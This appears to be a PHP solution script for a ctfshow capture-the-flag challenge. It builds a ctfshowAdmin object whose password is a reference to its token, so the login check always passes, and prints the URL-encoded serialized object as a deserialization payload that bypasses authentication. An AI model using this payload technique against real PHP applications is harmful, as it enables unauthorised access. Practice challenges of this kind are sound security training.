<?php
  class ctfshowAdmin{
      public $token;
      public $password;

      public function __construct($t,$p){
          $this->token=$t;
          $this->password = $p;
      }
      public function login(){
          return $this->token===$this->password;
      }
  }
  $a = new ctfshowAdmin(1,2);
  $a->password = &$a->token;
  echo urlencode(serialize($a));
  ?>